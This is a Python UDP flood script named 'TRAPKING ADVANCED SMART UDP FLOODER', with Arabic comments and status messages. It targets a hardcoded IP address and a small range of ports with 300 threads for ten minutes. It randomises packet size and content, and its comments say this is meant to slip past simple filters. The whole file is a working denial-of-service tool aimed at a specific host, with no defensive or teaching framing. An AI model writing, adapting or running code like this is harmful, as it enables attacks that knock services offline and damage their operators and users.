import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING ADVANCED SMART UDP FLOODER (Cloud Edition) ===
# =====================================================================

TARGET_IP = "89.46.1.130" 
BASE_PORT = 7008            # البورت الأساسي
PORT_RANGE = 5              # استهداف البورت الأساسي مع بورتات قريبة لإرباك الهدف
DURATION = 600               # مدة الهجوم بالثواني
THREADS_COUNT = 300         # رفع عدد الخيوط لاستغلال Ryzen 9 بأقصى طاقة

def smart_stress():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    end_time = time.time() + DURATION
    
    while time.time() < end_time:
        try:
            # توليد حجم وبصمة عشوائية للحزمة في كل مرة لتفادي الفلاتر البسيطة
            packet_size = random.randint(512, 1400)
            packet_data = random._urandom(packet_size)
            
            # اختيار بورت عشوائي ضمن النطاق المستهدف
            target_port = BASE_PORT + random.randint(0, PORT_RANGE)
            
            client.sendto(packet_data, (TARGET_IP, target_port))
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء الهجوم الذكي والموزع على الهدف: {TARGET_IP}")
    print(f"[*] النطاق المستهدف للبورتات: من {BASE_PORT} إلى {BASE_PORT + PORT_RANGE}")
    print(f"[*] تشغيل {THREADS_COUNT} خيط ذكي عبر الـ VPS...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=smart_stress)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت الجلسة الذكية.")

if __name__ == "__main__":
    main()
